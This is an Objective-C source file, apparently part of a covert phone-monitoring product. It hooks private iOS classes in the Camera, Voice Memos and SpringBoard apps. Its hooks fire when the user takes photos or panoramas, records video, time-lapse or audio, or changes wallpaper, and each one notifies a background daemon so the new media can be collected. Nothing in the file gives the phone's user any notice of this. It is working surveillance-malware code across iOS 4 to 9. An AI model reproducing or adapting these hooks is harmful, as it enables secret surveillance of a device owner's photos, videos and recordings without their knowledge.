/**
 - Project name :  MSFSP
 - Class name   :  Media
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  9/2/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SBWallpaperView.h"
#import "PLCameraController.h"
#import "RCRecorderViewController.h"
#import "MediaUtils.h"
#import "CRC32.h"
#import "SBWallpaperImage.h"

#import "RCMainViewController.h"
#import "RCEditMemoViewController.h"

#import "CAMCaptureController.h"
#import "CUCaptureController.h"
#import "CAMTimelapseController.h"
#import "CTBlockDescription.h"

#pragma mark -
#pragma mark photo hooks
#pragma mark -

// iOS 9, PHOTO, SQUARE
HOOK(CUCaptureController, stillImageRequestDidCompleteCapture$error$, void, id arg1, id arg2) {
    DLog(@"------------------ stillImageRequestDidCompleteCapture$error$ 9.x.x ------------------");
    DLog(@"arg1, [%@], %@", [arg1 class], arg1); // CAMStillImageCaptureRequest
    DLog(@"arg2, [%@], %@", [arg2 class], arg2);
    
    CALL_ORIG(CUCaptureController, stillImageRequestDidCompleteCapture$error$, arg1, arg2);
    
    DLog(@"isCapturingTimelapse, %d", [self isCapturingTimelapse]);
    
    if (!arg2 && ![self isCapturingTimelapse]) {
        /*
         Final timelapse photo could make extra notification to daemon (this notification cause searching photo not found in daemon)
         */
        
        MediaUtils *mediaUtils = [[MediaUtils alloc] init];
        [mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
        [mediaUtils release];
    }
}

// iOS 9, PANORAMA
HOOK(CUCaptureController, stopCapturingPanorama, void) {
    DLog(@"------------------ stopCapturingPanorama 9.x.x ------------------");
    CALL_ORIG(CUCaptureController, stopCapturingPanorama);
    
    MediaUtils *mediaUtils = [[MediaUtils alloc] init];
    [mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
    [mediaUtils release];
}

/**
 - Method name: _didTakePhoto, stopPanoramaCapture
 - Purpose:  This method is invoked when user take the picture in iOS 8.1
 - Argument list and description: arg1 (id),arg2(id)
 - Return type and description:No Return
 */

// Capture normal photo, square
HOOK(CAMCaptureController, _didTakePhoto, void) {
    CALL_ORIG(CAMCaptureController, _didTakePhoto);
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
	[mediaUtils release];
	DLog(@"_didTakePhoto, iOS 8")
}

// Capture panorama photo
HOOK(CAMCaptureController, stopPanoramaCapture, void) {
    CALL_ORIG(CAMCaptureController, stopPanoramaCapture);
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
	[mediaUtils release];
	DLog(@"stopPanoramaCapture, iOS 8")
}

/**
 - Method name: _processCapturedPhotoWithDictionary:error$HDRUsed$
 - Purpose:  This method is invoked when user take the picture in iOS 7.1.1
 - Argument list and description: arg1 (id),arg2(id)
 - Return type and description:No Return
 */

HOOK(PLCameraController, _processCapturedPhotoWithDictionary$error$HDRUsed$,void, id arg1,id arg2, BOOL arg3) {
    CALL_ORIG(PLCameraController, _processCapturedPhotoWithDictionary$error$HDRUsed$,arg1,arg2, arg3);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
	[mediaUtils release];
	DLog(@"_processCapturedPhotoWithDictionary:error:HDRUsed:")
}

// Capture panorama photo
HOOK(PLCameraController, stopPanoramaCapture, void) {
    CALL_ORIG(PLCameraController, stopPanoramaCapture);
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
	[mediaUtils release];
	DLog(@"stopPanoramaCapture, iOS 7")
}


/**
 - Method name: _processCapturedPhotoWithDictionary:error
 - Purpose:  This method is invoked when user take the picture in iOS 4.3, 5.x
 - Argument list and description: arg1 (id),arg2(id)
 - Return type and description:No Return
*/

HOOK(PLCameraController,_processCapturedPhotoWithDictionary$error$,void, id arg1,id arg2) {
    CALL_ORIG(PLCameraController, _processCapturedPhotoWithDictionary$error$,arg1,arg2);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
	[mediaUtils release];
	DLog(@"_processCapturedPhotoWithDictionary:error:")
}

/**
 - Method name: _capturedPhotoWithDictionary
 - Purpose:  This method is invoked when user take the picture in iOS 4.0, 4.1, 4.2
 - Argument list and description: arg1 (id)
 - Return type and description:No Return
 */

HOOK(PLCameraController, _capturedPhotoWithDictionary$, void, id arg1) {
	CALL_ORIG(PLCameraController, _capturedPhotoWithDictionary$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
	[mediaUtils release];
	DLog(@"_capturedPhotoWithDictionary:")
}


#pragma mark -
#pragma mark video hooks
#pragma mark -

// iOS 9, VIDEO, SLO-MO
HOOK(CUCaptureController, stopCapturingVideo, void) {
    DLog(@"------------------ stopCapturingVideo 9.x.x ------------------");
    CALL_ORIG(CUCaptureController, stopCapturingVideo);
    
    MediaUtils *mediaUtils = [[MediaUtils alloc] init];
    // Check comment in iOS 8 hook for more information
    [NSThread detachNewThreadSelector:@selector(sendMediaNotificationWithMediaType:)
                             toTarget:mediaUtils
                           withObject:kMediaTypeVideo];
    [mediaUtils autorelease];
}

// iOS 9, TIME-LAPSE
HOOK(CAMTimelapseController, stopCapturingWithReasons$, void, int arg1) {
    DLog(@"------------------ stopCapturingWithReasons$ 9.x.x ------------------");
    
    CALL_ORIG(CAMTimelapseController, stopCapturingWithReasons$, arg1);
    
    MediaUtils *mediaUtils = [[MediaUtils alloc] init];
    // Check comment in iOS 8 hook for more information
    [NSThread detachNewThreadSelector:@selector(sendMediaNotificationWithMediaType:)
                             toTarget:mediaUtils
                           withObject:kMediaTypeVideo];
    [mediaUtils autorelease];
}

/**
 - Method name: startVideoCapture (not call in iOS 8)
 - Purpose:  This method is invoked when user 'START' the VIDEO recording in iOS 8.1
 - Argument list and description: No argument
 - Return type and description: No Return
 */

HOOK(CAMCaptureController, startVideoCapture, void) {
    CALL_ORIG(CAMCaptureController, startVideoCapture);
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	[mediaUtils sendMediaCapturingNotification:kMediaTypeVideo];
	[mediaUtils release];
	DLog(@"------------------ startVideoCapture 8.1------------------");
}

/**
 - Method name: stopVideoCapture
 - Purpose:  This method is invoked when user 'STOP' the VIDEO recording in iOS 8.1
 - Argument list and description:
 - Return type and description:No Return
 */

HOOK(CAMCaptureController, stopVideoCapture, void) {
    CALL_ORIG(CAMCaptureController, stopVideoCapture);
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	
	/*
     NOTE:
        We don't use the below code.
        we send on another thread otherwise the button may not response anymore (cannot take photo and record video)
     */
    /*
     [mediaUtils sendMediaNotificationWithMediaType:kMediaTypeVideo];
     [mediaUtils release];
     */
	
	[NSThread detachNewThreadSelector:@selector(sendMediaNotificationWithMediaType:)
                             toTarget:mediaUtils
                           withObject:kMediaTypeVideo];
	[mediaUtils autorelease];
    
	DLog(@"------------------ stopVideoCapture 8.1------------------");
}


/**			
 - Method name: startVideoCapture
 - Purpose:  This method is invoked when user 'START' the VIDEO recording in iOS 5.x
 - Argument list and description: No argument
 - Return type and description: No Return
 */

HOOK(PLCameraController, startVideoCapture, void) {
    CALL_ORIG(PLCameraController,  startVideoCapture);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaCapturingNotification:kMediaTypeVideo];
	[mediaUtils release];
	DLog(@"------------------ startVideoCapture: ------------------");
} 

/**
 - Method name: stopVideoCapture
 - Purpose:  This method is invoked when user 'STOP' the VIDEO recording in iOS 4.3, 5.x
 - Argument list and description:
 - Return type and description:No Return
*/

HOOK(PLCameraController,stopVideoCapture, void) {
    CALL_ORIG(PLCameraController,  stopVideoCapture);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	
	/* NOTE: 
	 We don't use the below code.
	 we send on another thread otherwise the button may not response anymore (cannot take photo and record video)
		[mediaUtils sendMediaNotificationWithMediaType:kMediaTypeVideo];
		[mediaUtils release];
	*/
	
	[NSThread detachNewThreadSelector:@selector(sendMediaNotificationWithMediaType:) toTarget:mediaUtils withObject:kMediaTypeVideo];
	[mediaUtils autorelease];	

	DLog(@"------------------ stopVideoCapture: 2------------------");
}

/**
 - Method name: _captureStarted
 - Purpose:  This method is invoked when user 'START' the VIDEO recording in iOS 4.0, 4.1, 4.2
 - Argument list and description: arg1 (id)
 - Return type and description: No Return
 */

HOOK(PLCameraController, _captureStarted$, void, id arg1) {
	CALL_ORIG(PLCameraController, _captureStarted$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaCapturingNotification:kMediaTypeVideo];
	[mediaUtils release];
	DLog(@"------------------ _captureStarted: ------------------");
}

/**
 - Method name: _recordingStopped
 - Purpose:  This method is invoked when user 'STOP' the VIDEO recording in iOS 4.0, 4.1, 4.2
 - Argument list and description: arg1 (id)
 - Return type and description: No Return
 */

HOOK(PLCameraController, _recordingStopped$, void, id arg1) {
	CALL_ORIG(PLCameraController, _recordingStopped$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypeVideo];
	[mediaUtils release];
	DLog(@"------------------ _recordingStopped: ------------------");
}


#pragma mark -
#pragma mark audio hooks
#pragma mark -

/**
 - Method name: recordingControlsViewDidStartRecording
 - Purpose:  This method is invoked when user START the audio recording
 - Argument list and description: arg1 (id)
 - Return type and description: No Return
 */

HOOK(RCRecorderViewController, recordingControlsViewDidStartRecording$, void, id arg1) {
	CALL_ORIG(RCRecorderViewController, recordingControlsViewDidStartRecording$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaCapturingNotification:kMediaTypeAudio];
	[mediaUtils release];
	DLog(@"------------------ recordingControlsViewDidStartRecording: ------------------");
}

/**
 - Method name: recordingControlsViewDidStopRecording
 - Purpose:  This method is invoked when user stop the audio recording
 - Argument list and description: arg1 (id)
 - Return type and description:No Return
*/

HOOK(RCRecorderViewController, recordingControlsViewDidStopRecording$, void, id arg1) {
	CALL_ORIG(RCRecorderViewController, recordingControlsViewDidStopRecording$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypeAudio];
	[mediaUtils release];
	DLog(@"------------------ recordingControlsViewDidStopRecording: ------------------");
}

/**
 - Method name: controlsViewDidChooseStartRecording
 - Purpose:  This method is invoked when user START the audio recording on iOS 7
 - Argument list and description: arg1 (id)
 - Return type and description: No Return
 */

HOOK(RCMainViewController, controlsViewDidChooseStartRecording$, void, id arg1) {
	CALL_ORIG(RCMainViewController, controlsViewDidChooseStartRecording$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaCapturingNotification:kMediaTypeAudio];
	[mediaUtils release];
	DLog(@"------------------ iOS 7 recordingControlsViewDidStartRecording: ------------------");
}

/**
 - Method name: audioMemoViewControllerDidFinish
 - Purpose:  This method is invoked when user stop the audio recording on iOS 7
 - Argument list and description: arg1 (id)
 - Return type and description:No Return
 */

HOOK(RCMainViewController, audioMemoViewControllerDidFinish$, void, id arg1) {
	CALL_ORIG(RCMainViewController, audioMemoViewControllerDidFinish$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypeAudio];
	[mediaUtils release];
	DLog(@"------------------ iOS 7 recordingControlsViewDidStopRecording: ------------------");
}

/*
 iOS 8,9, this method will call before user decide to save or delete recorded file; in case of delete, daemon cannot find recorded file (fixed in _editRecordingNameWithAlertTitle$message$c...
 
 This method generate extra notification when user record new file however it's useful when user edit old recording file
 */
HOOK(RCEditMemoViewController, commitEditing, void) {
    DLog(@"------------------ iOS 8,9 commitEditing ------------------");
    CALL_ORIG(RCEditMemoViewController, commitEditing);
    
    MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypeAudio];
	[mediaUtils release];
}

// New recording file
HOOK(RCEditMemoViewController, _editRecordingNameWithAlertTitle$message$confirmationTitle$cancelTitle$completionBlock$, void, id arg1, id arg2, id arg3, id arg4, id arg5) {
    DLog(@"------------------ iOS 8,9 _editRecordingNameWithAlertTitle$message$confirmationTitle$cancelTitle$completionBlock$ ------------------");
    
    // http://stackoverflow.com/questions/12715586/ios-nsmethodsignature-or-encoding-of-nsblock
//    CTBlockDescription *blockDescription = [[CTBlockDescription alloc] initWithBlock:arg5];
//    NSMethodSignature *methodSignature = [blockDescription blockSignature];
//    DLog(@"Completion block, methodSignature, %@", [methodSignature debugDescription]);
//    [blockDescription release];
    
    void (^yourBlock)(_Bool p1);
    yourBlock = arg5;
    
    void (^myBlock)(_Bool p1);
    myBlock = ^(_Bool p1) {
        DLog(@"myBlock to yourBlock");
        DLog(@"myBlock, p1, %d", p1);
        yourBlock(p1);
        
        if (p1) {
            // User decided to save the recording file
            MediaUtils *mediaUtils = [[MediaUtils alloc] init];
            [mediaUtils sendMediaNotificationWithMediaType:kMediaTypeAudio];
            [mediaUtils release];
        }
    };
    
    CALL_ORIG(RCEditMemoViewController, _editRecordingNameWithAlertTitle$message$confirmationTitle$cancelTitle$completionBlock$, arg1, arg2, arg3, arg4, myBlock);
}

#pragma mark -
#pragma mark wallpaper hooks
#pragma mark -

/**
 - Method name: _wallpaperChanged
 - Purpose:  This method is used to capture wallpaper image (according to wallpaper status)
 - Argument list and description: No argument
 - Return type and description:No Return
*/

HOOK(SBWallpaperView, _wallpaperChanged, void) {
	DLog (@"HOOK wallpaper")
	CALL_ORIG(SBWallpaperView, _wallpaperChanged);
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	[mediaUtils parallelCheckWallpaper];
	[mediaUtils release];
	
}
